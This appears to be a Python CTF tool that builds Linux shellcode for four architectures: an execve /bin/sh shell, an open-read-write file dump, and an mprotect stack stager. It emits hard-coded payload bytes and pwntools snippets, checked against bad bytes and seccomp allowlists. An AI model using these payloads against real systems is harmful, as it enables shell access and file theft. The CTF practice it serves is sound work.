#!/usr/bin/env python3
"""Offline, syscall-aware Linux shellcode builder for CTF payload preparation.

``build_shellcode`` emits raw bytes and a literal pwntools snippet for four architectures.  It
never starts a process, opens a socket, or sends the payload.  The optional allowlist accepts the
``allowed`` field returned by :mod:`pwn_seccomp`; when ``execve`` is blocked but an open/read/write
route exists, an execve request is conservatively changed to ORW and labelled as such.

Supported payloads are intentionally small and auditable:

* ``execve``: ``/bin/sh`` (null-free variants on all four architectures);
* ``orw``: open/openat a caller-supplied path, read a bounded buffer, write it to stdout;
* ``mprotect_stager``: mark the current stack page RWX, then branch to the stack.

Bad-byte constraints are proofs, not promises: a candidate is returned only when none of the
forbidden bytes occurs.  If the built-in variant cannot satisfy the constraint, ``ShellcodeError``
lists the remaining bytes instead of silently returning a broken payload.
"""
from __future__ import annotations

import argparse
import itertools
import json
import struct
import sys
from dataclasses import dataclass
from pathlib import Path

try:
    import pwn_seccomp
except ImportError:  # pragma: no cover - direct loader with an unusual sys.path
    pwn_seccomp = None


ARCHES = ("amd64", "i386", "arm", "aarch64")
KINDS = ("execve", "orw", "mprotect_stager")
MAX_PATH = 127
MAX_ALLOWED = 512
MAX_FILE = 1 << 20


class ShellcodeError(ValueError):
    """A requested payload cannot be emitted under the stated constraints."""


@dataclass(frozen=True)
class ShellcodeBuild:
    raw: bytes
    arch: str
    requested_kind: str
    kind: str
    variant: str
    syscalls: tuple[str, ...]
    syscall_numbers: tuple[int, ...]
    bad_bytes: tuple[int, ...]
    pwntools: str
    notes: tuple[str, ...] = ()

    def as_dict(self) -> dict:
        return {
            "arch": self.arch,
            "requested_kind": self.requested_kind,
            "kind": self.kind,
            "variant": self.variant,
            "raw_hex": self.raw.hex(),
            "length": len(self.raw),
            "syscalls": list(self.syscalls),
            "syscall_numbers": list(self.syscall_numbers),
            "bad_bytes": [f"{value:02x}" for value in self.bad_bytes],
            "pwntools": self.pwntools,
            "notes": list(self.notes),
        }


_FALLBACK_SYSCALLS = {
    "amd64": {"read": 0, "write": 1, "open": 2, "mprotect": 10, "execve": 59, "openat": 257},
    "i386": {"read": 3, "write": 4, "open": 5, "execve": 11, "mprotect": 125, "openat": 295},
    "arm": {"read": 3, "write": 4, "open": 5, "execve": 11, "mprotect": 125, "openat": 322},
    "aarch64": {"openat": 56, "read": 63, "write": 64, "execve": 221, "mprotect": 226},
}


def _syscalls(arch: str) -> dict[str, int]:
    if pwn_seccomp is not None:
        table = getattr(pwn_seccomp, "SYSCALLS", {}).get(arch)
        if isinstance(table, dict):
            return table
    return _FALLBACK_SYSCALLS[arch]


def _bad_set(value) -> set[int]:
    if value is None:
        return set()
    if isinstance(value, str):
        text = value.strip().lower().replace("\\x", "").replace("0x", "")
        parts = [part for part in text.replace(":", ",").replace(" ", ",").split(",") if part]
        if not parts:
            return set()
        try:
            values = {int(part, 16) for part in parts}
        except ValueError as exc:
            raise ShellcodeError("bad bytes must be comma-separated hexadecimal octets") from exc
    elif isinstance(value, (bytes, bytearray)):
        if len(value) > 4096:
            raise ShellcodeError("bad-byte input exceeds cap")
        values = set(value)
    else:
        try:
            items = list(itertools.islice(iter(value), 258))
        except TypeError as exc:
            raise ShellcodeError("bad bytes must be bytes or integers") from exc
        if len(items) > 257:
            raise ShellcodeError("bad-byte input exceeds cap")
        values = set()
        for item in items:
            if isinstance(item, bool) or not isinstance(item, int):
                raise ShellcodeError("bad bytes must be integers")
            values.add(item)
    if any(not 0 <= item <= 255 for item in values):
        raise ShellcodeError("bad bytes must be in 0..255")
    return values


def _allowed_names(value, arch: str) -> set[str] | None:
    if value is None:
        return None
    if isinstance(value, dict):
        if isinstance(value.get("analysis"), dict):
            value = value["analysis"]
        value = value.get("allowed")
    if isinstance(value, str):
        value = [part for part in value.replace(" ", ",").split(",") if part]
    try:
        items = list(itertools.islice(iter(value), MAX_ALLOWED + 1))
    except TypeError as exc:
        raise ShellcodeError("allowed_syscalls must be a sequence or seccomp report") from exc
    if len(items) > MAX_ALLOWED:
        raise ShellcodeError("allowed syscall list exceeds cap")
    inverse = {number: name for name, number in _syscalls(arch).items()}
    out = set()
    for item in items:
        if isinstance(item, bool):
            raise ShellcodeError("boolean is not a syscall")
        if isinstance(item, int):
            if item in inverse:
                out.add(inverse[item])
        elif isinstance(item, str):
            name = item.strip()
            if name in _syscalls(arch):
                out.add(name)
            elif name.isdigit() and int(name) in inverse:
                out.add(inverse[int(name)])
        else:
            raise ShellcodeError("allowed syscalls must be names or numbers")
    return out


def _validate_path(path: str) -> bytes:
    if not isinstance(path, str):
        raise ShellcodeError("ORW path must be text")
    try:
        raw = path.encode("utf-8")
    except UnicodeError as exc:
        raise ShellcodeError("ORW path is not valid UTF-8") from exc
    if not raw or len(raw) > MAX_PATH or b"\x00" in raw:
        raise ShellcodeError(f"ORW path must be 1..{MAX_PATH} bytes without NUL")
    return raw


def _jmp_call_pop(code: bytes, path: bytes, *, self_terminate: bool) -> bytes:
    if len(code) > 127:
        raise ShellcodeError("internal x86 ORW body exceeds short-jump range")
    relative = -(len(code) + 5)
    terminator = b"X" if self_terminate else b"\x00"
    return b"\xeb" + bytes([len(code)]) + code + b"\xe8" + struct.pack("<i", relative) + path + terminator


def _x86_orw(arch: str, path: bytes, opener: str, *, self_terminate: bool) -> bytes:
    length = len(path)
    if length > 127:
        raise ShellcodeError("x86 ORW path exceeds disp8 range")
    if arch == "amd64":
        if opener == "open":
            # A payload may enter with arbitrary RAX/EAX.  ``mov al, nr`` does
            # not clear the high bytes, so zero the full syscall register
            # before selecting open(2).
            body = b"\x5f\x31\xf6"
            if self_terminate:
                body += b"\x40\x88\x77" + bytes([length])
            body += b"\x31\xd2\x31\xc0\xb0\x02\x0f\x05"
        else:
            body = b"\x5e\x31\xd2"
            if self_terminate:
                body += b"\x88\x56" + bytes([length])
            body += b"\x6a\x9c\x5f\x45\x31\xd2\x66\xb8\x01\x01\x0f\x05"
        body += (b"\x89\xc7\x48\x83\xec\x7f\x48\x83\xec\x7f\x48\x83\xec\x02"
                 b"\x48\x89\xe6\x31\xd2\xb6\x01\x31\xc0\x0f\x05\x89\xc2"
                 b"\x6a\x01\x5f\xb0\x01\x0f\x05\xcc")
    else:
        if opener == "open":
            body = b"\x5b\x31\xc9"
            if self_terminate:
                body += b"\x88\x4b" + bytes([length])
            body += b"\x31\xd2\x31\xc0\xb0\x05\xcd\x80"
        else:
            body = b"\x59\x31\xd2"
            if self_terminate:
                body += b"\x88\x51" + bytes([length])
            body += b"\x6a\x9c\x5b\x31\xf6\x31\xc0\x66\xb8\x27\x01\xcd\x80"
        body += (b"\x89\xc3\x83\xec\x7f\x83\xec\x7f\x83\xec\x02\x89\xe1"
                 b"\x31\xd2\xb6\x01\x31\xc0\xb0\x03\xcd\x80\x89\xc2"
                 b"\x6a\x01\x5b\x6a\x04\x58\xcd\x80\xcc")
    return _jmp_call_pop(body, path, self_terminate=self_terminate)


_ARM_EXECVE = bytes.fromhex(
    "01308fe213ff2fe178460a304940017252400b2701df2f2f62696e2f736858"
)
_AARCH64_EXECVE = bytes.fromhex(
    "e3458cd223cdadf2e365cef2030de0f2e30f1ff8e0031faae063208be1031faae2031faaa81b80d2e16602d4"
)

_ARM_ORW_OPEN = bytearray.fromhex(
    "01308fe213ff2fe178462430494041715240052701df04462046bfb06946fc22032701df024601206946042701df01be"
)
_ARM_ORW_OPENAT = bytearray.fromhex(
    "01308fe213ff2fe179462a3152404a71404064385b4040f2421701df04462046bfb06946fc22032701df024601206946042701df01be"
)
_AARCH64_ORW = bytearray.fromhex(
    "41020010e2031faa22140039600c8092e3031faa080780d2e16602d4ff0304d1e1031faae163218b022080d2e80780d2e16602d4e20300aa200080d2080880d2e16602d4e06622d4"
)

_MPROTECT = {
    "amd64": bytes.fromhex("4889e748c1ef0c48c1e70c6a015ec1e60c6a075a6a0a580f05ffe4"),
    "i386": bytes.fromhex("89e3c1eb0cc1e30c6a0159c1e10c6a075a6a7d58cd80ffe4"),
    "arm": bytes.fromhex("01308fe213ff2fe16846000b00030121090307227d2701df68460047"),
    "aarch64": bytes.fromhex("e0031faae063208b00fc4cd300cc74d3210080d221cc74d3e20080d2481c80d2e16602d4e0031faae063208b00001fd6"),
}


def _arm_orw(path: bytes, opener: str, *, self_terminate: bool) -> bytes:
    if self_terminate and len(path) > 31:
        raise ShellcodeError("ARM ORW path exceeds the Thumb strb immediate range (31 bytes)")
    body = bytearray(_ARM_ORW_OPEN if opener == "open" else _ARM_ORW_OPENAT)
    if self_terminate:
        # The path sentinel is overwritten with zero before open/openat.  Both STRB instructions
        # use a five-bit byte offset; keep their registers and replace only imm5.
        offset = 14
        word = struct.unpack_from("<H", body, offset)[0]
        word = (word & ~(0x1F << 6)) | (len(path) << 6)
        struct.pack_into("<H", body, offset, word)
        terminator = b"X"
    else:
        # A literal NUL needs no self-modifying STRB.  Remove it and retarget the Thumb PC-relative
        # ADD to the path's new position (Thumb reads PC as this instruction's address + 4).
        del body[14:16]
        body[10] = len(body) - 12
        terminator = b"\x00"
    return bytes(body) + path + terminator


def _aarch64_orw(path: bytes, *, self_terminate: bool) -> bytes:
    if len(path) > 4095:
        raise ShellcodeError("AArch64 ORW path exceeds strb immediate range")
    body = bytearray(_AARCH64_ORW)
    if not self_terminate:
        # Keep x2 zero for openat flags, but drop the needless store into the executable mapping.
        del body[8:12]
    # Re-encode ADR against the selected body length rather than trusting the checked-in bytes.
    imm = len(body)
    adr = 0x10000000 | ((imm & 3) << 29) | (((imm >> 2) & 0x7FFFF) << 5) | 1
    struct.pack_into("<I", body, 0, adr)
    if self_terminate:
        strb = 0x39000000 | (len(path) << 10) | (1 << 5) | 2
        struct.pack_into("<I", body, 8, strb)
    return bytes(body) + path + (b"X" if self_terminate else b"\x00")


def _pick_opener(arch: str, allowed: set[str] | None) -> str:
    available = ("open", "openat") if arch != "aarch64" else ("openat",)
    if allowed is None:
        return available[0]
    for name in available:
        if name in allowed:
            return name
    raise ShellcodeError("ORW needs open/openat in the seccomp allowlist")


def _snippet(raw: bytes, arch: str, bad: set[int]) -> str:
    avoid = ", ".join(f"0x{value:02x}" for value in sorted(bad))
    lines = [
        "from pwn import context",
        f"context.clear(arch={arch!r}, os='linux')",
        f"shellcode = bytes.fromhex({raw.hex()!r})",
    ]
    if bad:
        lines.append(f"assert not (set(shellcode) & {{{avoid}}})")
    lines.append("# Send only through the event's scope-locked client to the assigned target.")
    return "\n".join(lines) + "\n"


def build_shellcode(kind: str, arch: str, avoid=None, allowed_syscalls=None, *, path: str = "/flag") -> ShellcodeBuild:
    """Build one verified-constraint payload; raise :class:`ShellcodeError` on no exact candidate.

    ``allowed_syscalls`` may be an iterable of names/numbers or the ``analysis``/report dictionary
    emitted by ``pwn_seccomp``.  An execve request falls back to ORW only when execve is absent and
    a complete ORW route is present.
    """
    if arch not in ARCHES:
        raise ShellcodeError(f"unknown architecture {arch!r}; choose {', '.join(ARCHES)}")
    kind = kind.replace("-", "_") if isinstance(kind, str) else kind
    if kind not in KINDS:
        raise ShellcodeError(f"unknown kind {kind!r}; choose {', '.join(KINDS)}")
    requested = kind
    bad = _bad_set(avoid)
    allowed = _allowed_names(allowed_syscalls, arch)
    notes = []
    if kind == "execve" and allowed is not None and "execve" not in allowed:
        can_orw = "read" in allowed and "write" in allowed and bool({"open", "openat"} & allowed)
        if not can_orw:
            raise ShellcodeError("execve is blocked and the allowlist has no complete ORW route")
        kind = "orw"
        notes.append("execve blocked by supplied allowlist; emitted ORW instead")

    table = _syscalls(arch)
    if kind == "execve":
        names = ("execve",)
        if allowed is not None and not set(names) <= allowed:
            raise ShellcodeError("execve is not in the supplied syscall allowlist")
        raw = {
            "amd64": bytes.fromhex("4831d248bb2f2f62696e2f736848c1eb08534889e750574889e6b03b0f05"),
            "i386": bytes.fromhex("31c050682f2f7368682f62696e89e3505389e1b00bcd80"),
            "arm": _ARM_EXECVE,
            "aarch64": _AARCH64_EXECVE,
        }[arch]
        variant = "null-free-bin-sh"
    elif kind == "orw":
        path_bytes = _validate_path(path)
        # Prefer a conventional literal C-string.  The in-place terminator is retained only for
        # callers that explicitly forbid NUL bytes and therefore promise a writable code buffer.
        self_terminate = 0 in bad
        opener = _pick_opener(arch, allowed)
        names = (opener, "read", "write")
        if allowed is not None and not set(names) <= allowed:
            missing = sorted(set(names) - allowed)
            raise ShellcodeError("ORW syscall(s) blocked: " + ", ".join(missing))
        if arch in ("amd64", "i386"):
            raw = _x86_orw(arch, path_bytes, opener, self_terminate=self_terminate)
        elif arch == "arm":
            raw = _arm_orw(path_bytes, opener, self_terminate=self_terminate)
        else:
            raw = _aarch64_orw(path_bytes, self_terminate=self_terminate)
        termination = "self-terminating" if self_terminate else "nul-terminated"
        variant = f"{opener}-read-write-{termination}-path"
    else:
        names = ("mprotect",)
        if allowed is not None and "mprotect" not in allowed:
            raise ShellcodeError("mprotect is not in the supplied syscall allowlist")
        raw = _MPROTECT[arch]
        variant = "current-stack-page-rwx"

    present = sorted(set(raw) & bad)
    if present:
        rendered = ", ".join(f"{value:02x}" for value in present)
        raise ShellcodeError(f"no built-in {arch}/{kind} variant avoids byte(s): {rendered}")
    numbers = tuple(table[name] for name in names)
    return ShellcodeBuild(raw=raw, arch=arch, requested_kind=requested, kind=kind, variant=variant,
                          syscalls=tuple(names), syscall_numbers=numbers,
                          bad_bytes=tuple(sorted(bad)), pwntools=_snippet(raw, arch, bad),
                          notes=tuple(notes))


class _Parser(argparse.ArgumentParser):
    def error(self, message: str) -> None:  # pragma: no cover
        raise ShellcodeError(message)


def _allowed_json(path: str):
    with Path(path).open("rb") as handle:
        raw = handle.read(MAX_FILE + 1)
    if len(raw) > MAX_FILE:
        raise ShellcodeError("allowlist JSON exceeds 1 MiB cap")
    try:
        value = json.loads(raw.decode("utf-8"))
    except (UnicodeError, json.JSONDecodeError) as exc:
        raise ShellcodeError(f"invalid allowlist JSON: {exc}") from exc
    if isinstance(value, dict) and isinstance(value.get("analysis"), dict):
        value = value["analysis"]
    return value


def main(argv: list[str] | None = None) -> int:
    parser = _Parser(prog="pwn_shellcode.py")
    parser.add_argument("kind", choices=KINDS)
    parser.add_argument("arch", choices=ARCHES)
    parser.add_argument("--avoid", default="")
    parser.add_argument("--allowed", help="comma-separated syscall names")
    parser.add_argument("--seccomp-json", help="pwn_seccomp JSON/report")
    parser.add_argument("--path", default="/flag")
    parser.add_argument("--json", action="store_true")
    try:
        try:
            args = parser.parse_args(argv)
        except SystemExit as exc:
            # argparse's -h/--help prints and raises SystemExit(0); return a
            # status code instead of letting it escape main().
            return 0 if exc.code in (0, None) else 2
        if args.allowed and args.seccomp_json:
            raise ShellcodeError("choose --allowed or --seccomp-json, not both")
        allowed = _allowed_json(args.seccomp_json) if args.seccomp_json else args.allowed
        result = build_shellcode(args.kind, args.arch, args.avoid, allowed, path=args.path)
        if args.json:
            print(json.dumps(result.as_dict(), sort_keys=True))
        else:
            print(f"CANDIDATE [constraint-checked] {result.arch}/{result.kind} {result.raw.hex()}")
            print(result.pwntools, end="")
        return 0
    except (OSError, ShellcodeError, TypeError, ValueError, OverflowError,
            RecursionError, MemoryError) as exc:
        print(f"pwn_shellcode: {exc}", file=sys.stderr)
        return 2


if __name__ == "__main__":
    raise SystemExit(main())
